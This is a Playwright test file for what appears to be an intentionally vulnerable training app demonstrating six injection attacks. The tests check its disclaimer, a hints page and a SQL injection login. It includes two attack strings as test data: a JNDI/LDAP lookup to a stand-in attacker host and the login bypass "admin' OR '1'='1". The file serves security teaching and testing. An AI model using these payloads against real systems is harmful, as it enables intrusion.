import { test, expect } from '@playwright/test'

test('home renders the tagline, disclaimer and endpoint links', async ({ page }) => {
  await page.goto('/')
  await expect(page.getByText('Six classic injections. Zero guards. Everything lands.')).toBeVisible()
  await expect(page.getByRole('note')).toContainText('intentionally vulnerable')
  await expect(page.getByRole('note')).toContainText('logged')
  await expect(page.getByRole('link', { name: 'Ping (Command)' })).toBeVisible()
})

test('hints page lists the injection points', async ({ page }) => {
  await page.goto('/hints')
  await expect(page.getByText("This isn't a find-the-bug game.")).toBeVisible()
  await expect(page.getByText('${jndi:ldap://attacker/x}')).toBeVisible()
})

test('SQLi login fires with an attack payload and stays benign otherwise', async ({ page }) => {
  await page.goto('/login')

  await page.getByRole('button', { name: "admin' OR '1'='1" }).click()
  await page.getByRole('button', { name: 'Sign in' }).click()
  await expect(page.getByRole('alert')).toContainText('Attack landed')
  await expect(page.getByRole('alert')).toContainText('sqli')

  await page.getByLabel('Username').fill('alice')
  await page.getByLabel('Password').fill('wrong')
  await page.getByRole('button', { name: 'Sign in' }).click()
  await expect(page.getByRole('status')).toContainText('Benign response')
})
